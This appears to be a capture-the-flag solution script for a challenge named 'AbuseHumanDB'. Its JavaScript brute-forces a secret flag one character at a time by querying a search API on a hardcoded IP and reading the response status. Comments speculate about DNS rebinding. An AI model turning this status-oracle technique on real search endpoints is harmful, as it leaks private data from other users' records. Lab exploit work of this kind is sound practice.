// AbuseHumanDB

// Vulnerability:
// Vulnerable code - database.js
// Might be a DNS rebinding?? - DNS rebinding is a technique that turns a victim’s browser into a proxy for attacking private networks.

// References:
// jQuery-3.6.0 - The latest version (https://security.snyk.io/package/npm/jquery)
// Bootstrap v5.1.3 - The laste version is 5.2.0 but there is no direct vuln to the current version (https://security.snyk.io/package/maven/org.webjars:bootstrap/5.1.3)

// POC of querying flag by status.code
var url = "http://209.97.142.95:32390";
var searchQuery = "/api/entries/search?q=";
var flag = "Ba";

var letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";

async function attack() {
    for(j = 0; j < 3; j++) {
        for(i = 0; i < letters.length; i++) {
            const script = document.createElement('script');
            const s = letters[i]
            let request = await fetch(url + searchQuery + flag + s);
            
            if (request.ok) {
                console.log(s);
                flag = flag.concat(s);
                break;
            }
        }
        console.log(flag);
    }
}
attack();
